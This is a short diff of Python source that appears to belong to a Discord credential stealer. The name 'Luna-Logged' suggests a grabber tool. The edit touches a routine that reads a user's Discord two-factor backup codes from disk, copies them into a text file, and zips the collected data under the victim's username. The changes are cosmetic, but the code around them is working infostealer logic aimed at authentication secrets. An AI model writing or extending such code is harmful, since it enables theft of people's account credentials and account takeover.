@@ -552,14 +552,14 @@ class mfa_codes():
 
     def get_codes(self):
         with open(".\\discord-2fa-codes.txt", "w", encoding="utf-8", errors='ignore') as f:
-            f.write(f"{github} | Discord Backup Codes\n\n")
+            f.write(f"{github} | Discord Backup Codes\n")
             if os.path.exists(self.path + self.code_path):
                 with open(self.path + self.code_path, 'r') as g:
                     for line in g.readlines():
                         if line.startswith("*"):
                             f.write(line)
             else:
-                f.write("\n No discord backup codes found")
+                f.write("No discord backup codes found")
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
